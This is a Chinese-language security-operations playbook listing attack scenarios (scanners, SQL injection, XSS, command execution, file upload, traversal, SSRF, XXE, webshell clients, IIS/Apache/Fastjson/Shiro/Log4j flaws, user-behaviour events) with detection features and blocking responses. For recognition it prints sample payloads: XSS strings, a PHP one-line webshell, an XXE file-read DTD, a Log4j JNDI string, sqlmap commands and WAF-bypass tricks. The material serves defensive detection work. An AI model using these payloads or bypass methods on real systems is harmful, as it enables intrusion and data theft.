
# 一、扫描事件

## 1.1、目录扫描
**场景描述**<br />web日志在短时间内大量的访问请求或者404请求

**场景说明**<br />暂无

**处理方法**<br />关联威胁情报，分析ip威胁性。具有明显攻击特征的ip由waf进行封堵，如果是低风险ip,根据次数触发封禁策略。


## 1.2、SQLMAP扫描
**场景描述**<br />web日志中会出现存在sqlmap的User-agent

**场景说明**<br />通过过滤匹配日志中的user-agent头信息可能会出现sqlmap字段
```python
sqlmap.py -u “http://www.baidu.com”  --dbs Post： sqlmap.py -r  1.txt  --dbs
```

**处理方法**<br />通过DSM检查目标服务器是否有敏感信息泄露和脏数据插入行为，在由waf对源ip进行封禁


## 1.3、Nmap扫描
**场景描述**<br />web日志中会出现存在nmap的User-agent

**场景说明**<br />暂无

**处理方法**<br />根据内网和外网区分是正常扫描行为，还是攻击行为，再由防火墙进行封堵


## 1.4、AWVS扫描
**场景描述**<br />Awvs在请求的Url，Headers, Body三项里随机包含了能代表自己的特征信息（acunetix）

**场景说明**<br />Appscan扫描<br />绿盟RSAS扫描<br />Nessus扫描

**处理方法**<br />先由威胁情报对ip进行分析，黑产ip由防火墙进行封堵


# 二、高危漏洞利用事件

## 2.1、SQL注入
**场景描述**<br />请求包里会出现明显的数据库查询语句

**场景说明**<br />重点可以排查一些关键字例如：order by ,union ,and 1=1,update,insert，delete,sleep，updatexml，extractvalue等字符判断是否存在sql注入

还有绕waf的常见手法：内敛注释方法用的比较多/*!select*/，大小写，双写，编码等方法进行绕过

**处理方法**<br />针对web端攻击，根据IP地址，威胁情报调查，结合攻击事件，由waf根据威胁等级进行封堵，白名单内可以根据时间内的次数进行排查，封堵


## 2.2、XSS跨站
**场景描述**<br />在网页中嵌入客户端恶意脚本代码，最常用的攻击代码是javascript语言，但也会使用其它的脚本语言

**场景说明**
```python
<script>alert(‘xss’)</script>
<iframe src=javascript:alert(1)>
<img src=1 onerror=alert("xss");>
```
等常见攻击语句，也可以根据关键字判断是否存在xss攻击：script、alert、prompt、confirm、onerror、onclick、onloa

存在绕过安全设备的一些手法，双写，大小写，编码常见绕过手法

**处理方法**<br />针对web端攻击，根据IP地址，威胁情报调查，结合攻击事件，由waf根据威胁等级进行封堵，白名单内可以根据时间内的次数进行排查，封堵


## 2.3、命令执行与代码执行
**场景描述**<br />使用不安全的系统命令执行函数导致rce

**场景说明**<br />常见代码执行函数：eval, assert, call_user_func,base64_decode, gzinflate, gzuncompress, gzdecode<br />命令执行函数：assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open

**处理方法**<br />针对web端攻击，根据IP地址，威胁情报调查，结合攻击事件，由waf根据威胁等级进行封堵，白名单内可以根据时间内的次数进行排查，封堵


## 2.4、文件上传
**场景描述**<br />日志会出现filename= ，upload字段

**场景说明**<br />判别文件上传根据上传文件名以及内容，如.asp、.aspx、.php、.jsp、jpg、PhP、php3等判别文件名，内容进行解码等方式查看是否存在危险函数，这里常见上传的是图片马或者是一句话木马：<?php @eval($_POST[value]);?>

常见绕过方法：点，空格，双写，大小写，::$DATA,00%截断等

**处理方法**<br />针对web端攻击，根据IP地址，威胁情报调查，结合攻击事件，由waf根据威胁等级进行封堵，白名单内可以根据时间内的次数进行排查，封堵


## 2.5、目录遍历
**场景描述**<br />一般在请求头里出现filename=../接敏感文件，etc/password,etc/shadow

**场景说明**<br />文件读取漏洞判断根据是否有 ../../../../、..%252f..%252f、../../../等穿越路径特征判别或者出现状态码为403，404状态

**处理方法**<br />针对web端攻击，根据IP地址，威胁情报调查，结合攻击事件，由waf根据威胁等级进行封堵，白名单内可以根据时间内的次数进行排查，封堵


## 2.6、SSRF（服务端请求伪造）
**场景描述**<br />主要是页面跳转，攻击者会利用拼接内网地址来攻击内网，读取文件等，返回包往往会出现301或者302状态码

**场景说明**<br />顾虑匹配关键字：<br />file_get_contents()
fsockopen()
curl_exec()

**处理方法**<br />针对web端攻击，根据IP地址，威胁情报调查，结合攻击事件，由waf根据威胁等级进行封堵，白名单内可以根据时间内的次数进行排查，封堵


## 2.7、XXE漏洞
**场景描述**<br />外部实体注入，也称xml注入漏洞，可以造成造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害

**场景说明**<br />通常是通过定义DTD文档类型实现攻击
```python
<?xml version="1.0" encoding="utf-8"?>

<!DOCTYPE Anything [
<!ENTITY entityex SYSTEM "file:///c:/1.txt">
]>

<abc>&entityex;</abc>
```

**处理方法**<br />针对web端攻击，根据IP地址，威胁情报调查，结合攻击事件，由waf根据威胁等级进行封堵，白名单内可以根据时间内的次数进行排查，封堵


# 三、WenShell事件

## 3.1、菜刀
**场景描述**<br />菜刀在与webshell交互时会使用base64编码，和“z0”字段

**场景说明**<br />重点检测原始日志内容里是否包括&z0=”+base64编码

**处理方法**<br />威胁情报对ip进行调查 ，根据风险等级由waf对ip进行阻断，僵木蠕通过与特征库进行匹配然后将疑似恶意样本进行动态核查，将确定后的恶意样本比对结果上报到管理中心平台


## 3.2、蚁剑
**场景描述**<br />蚁剑流量在交互过程中会用到base64编码和定义utf-8

**场景说明**<br />日志内容里包含 @ini_set+base64编码

**处理方法**<br />威胁情报对ip进行调查 ，根据风险等级由waf对ip进行阻断，僵木蠕通过与特征库进行匹配然后将疑似恶意样本进行动态核查，将确定后的恶意样本比对结果上报到管理中心平台


## 3.3、冰蝎
**场景描述**<br />冰蝎流量在交互过程中会出现“Transfer-Encoding: chunked”字段，也会存在php?pass=字段

**场景说明**<br />检测流量时可对“Transfer-Encoding: chunked”字段，php?pass=字段进行匹配检测，但是误报较大

**处理方法**<br />威胁情报对ip进行调查 ，根据风险等级由waf对ip进行阻断，僵木蠕通过与特征库进行匹配然后将疑似恶意样本进行动态核查，将确定后的恶意样本比对结果上报到管理中心平台

## 3.4、哥斯拉
**场景描述**<br />发送一段固定代码（payload），http响应为空

**场景说明**<br />暂无

**处理方法**<br />威胁情报对ip进行调查 ，根据风险等级由waf对ip进行阻断，僵木蠕通过与特征库进行匹配然后将疑似恶意样本进行动态核查，将确定后的恶意样本比对结果上报到管理中心平台


# 四、中间件/框架漏洞

## 4.1、IIS
**场景描述**<br />会将.asp;.jpg这种格式的文件当成asp文件解析，也会将.jpg/.php解析成php脚本

**场景说明**<br />攻击者利用解析漏洞上产一句话木马<?php @eval($_POST[value]);?>

**处理方法**<br />暂无


## 4.2、Appache
**场景描述**<br />1.php.jpg ,解析到1.php 

**场景说明**<br />暂无

**处理方法**<br />暂无


## 4.3、FastJson框架漏洞
**场景描述**<br />利用 fastjson autotype解析功能，并远程调用rmi主机实现恶意代码执行

**场景说明**<br />日志里包括@type和rmi等字段特征

**处理方法**<br />过滤匹配特征，有威胁情报调查ip,和时间内的攻击次数进行封堵


## 4.4、Shiro漏洞
**场景描述**<br />AES加密密钥泄露导致的反序列化漏洞

**场景说明**<br />在返回包的set-cookie中存在rememberMe-deledatme字段

**处理方法**<br />暂无


## 4.5、Log4j框架
**场景描述**<br />攻击者使用 `${}` 关键标识符触发 JNDI （java应用程序api接口）注入漏洞

**场景说明**<br />攻击语句：${jndi:ldap:192.168.96.1:1099/exp}

**处理方法**<br />暂无


# 五、上网行为管理

## 5.1、FTP登陆事件
**场景描述**<br />是用于在网络上进行文件传输的一套标准协议，使用客户/服务器模式。它属于网络传输协议的应用层。FTP使用21号端口。

**场景说明**<br />FTP 弱口令或匿名登录漏洞,弱口令一般是存在暴力破解，而匿名登陆是开启匿名登陆功能，因此容易被黑客利用。

**处理方法**<br />可监测同一ip是否尝试多次FTP连接,内网ip建议限制时间范围连接次数，封禁时间，外网ip有威胁情报进行分析，根据威胁等级进行策略下发


## 5.2、VPN异地多点登录
**场景描述**<br />在公用网络上建立专用网络，进行加密通讯，用于访问公司内网资源服务

**场景说明**<br />非常用地址登入后访问非所属办公网段，以及登入时间多为非办公时间段，登入后的的大量下载和文件外发

**处理方法**<br />可以根据登入时间，频率，可以过滤掉异常的登录行为，封禁有限时间。关联ip情报，具有黑产特征ip进行封禁，低风险ip根据访问内容，次数触发封禁策略，DLP数据防泄漏


## 5.3、内网访问黑产域名阻断
**场景描述**<br />由内部网络发起的访问，恶意域名

**场景说明**<br />访问黑产域名，容易被黑客利用，造成信息泄露，邮件钓鱼，木马植入等风险

**处理方法**<br />威胁情报目的ip调查，域名调查，再由防火墙封禁。


## 5.4、邮箱记录事件
**场景描述**<br />记录外部邮箱与内部邮箱交互内容

**场景说明**<br />监控邮件标题/内容/附件是否为敏感文件、监控邮件来源是否存在恶意标签等

**处理方法**<br />防火墙发件人邮箱阻断，和收件人邮箱阻断。阻断任何不在安全发件人和域列表中的任何邮件


## 5.5、账号登陆事件
**场景描述**<br />监测用户登录行为

**场景说明**<br />同一ip是否尝试多次登录

**处理方法**<br />威胁情报ip调查，外网ip根据风险等级，由防火墙进行封堵，内网ip 根据登入时间，次数，制定有效封堵时间。


## 5.6、Telent命令事件
**场景描述**<br />telnet命令执行行为

**场景说明**<br />可监测telnet执行命令有无远程连接，查看敏感文件等命令

**处理方法**<br />威胁情报ip调查，外网ip根据风险等级，由防火墙进行封堵，内网ip 根据登入时间，次数，制定有效封堵时间。


### 5.7、向日葵远程连接阻断
**场景描述**<br />由外到内的向日葵连接请求封禁

**场景说明**<br />公司外网向公司内部的终端或服务器发起远程控制请求时，需要将请求拦截

**处理方法**<br />当源地址归属为外网，目标地址归属为内网时，防火墙下发封堵策略



## 5.8、EDR恶意程序阻断
**场景描述**<br />阻止公司内网中使用恶意程序

**场景说明**<br />当网络中出现黑客程序、存在后门程序等恶意程序时，需要封禁源Ip网络访问权限，并对源IP启动恶意程序扫描

**处理方法**<br />出现恶意程序告警，由EDR启动对源IP地址资产的全盘扫描，并弹窗提示终端，要求终端自查。由防火墙限制问题终端的入网权限，限制源IP地址终端的网络

